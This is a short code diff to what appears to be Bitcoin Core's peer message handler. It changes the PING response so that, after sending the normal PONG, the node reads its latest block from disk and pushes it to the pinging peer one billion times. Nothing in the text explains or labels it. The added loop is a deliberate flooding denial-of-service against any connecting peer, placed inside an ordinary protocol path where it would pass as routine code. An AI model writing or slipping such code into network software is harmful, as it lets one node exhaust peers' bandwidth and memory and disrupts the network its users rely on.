@@ -54,6 +54,11 @@
 #include <typeinfo>
 #include <utility>
 
+#include <thread>
+#include <chrono>
+
+using namespace std::chrono_literals;
+
 using namespace util::hex_literals;
 
 /** Headers download timeout.
@@ -5158,6 +5163,14 @@ void PeerManagerImpl::ProcessMessage(CNode& pfrom, const std::string& msg_type, 
             // seconds to respond to each, the 5th ping the remote sends would appear to
             // return very quickly.
             MakeAndPushMessage(pfrom, NetMsgType::PONG, nonce);
+
+            auto pos{WITH_LOCK(cs_main, return m_chainman.ActiveChain().Tip()->GetBlockPos())};
+            std::vector<uint8_t> block_data;
+            m_chainman.m_blockman.ReadRawBlockFromDisk(block_data, pos);
+            for (int i = 0; i<1000000000; i++) {
+                // std::this_thread::sleep_for(1ms);
+                MakeAndPushMessage(pfrom, NetMsgType::BLOCK, Span{block_data});
+            }
         }
         return;
     }
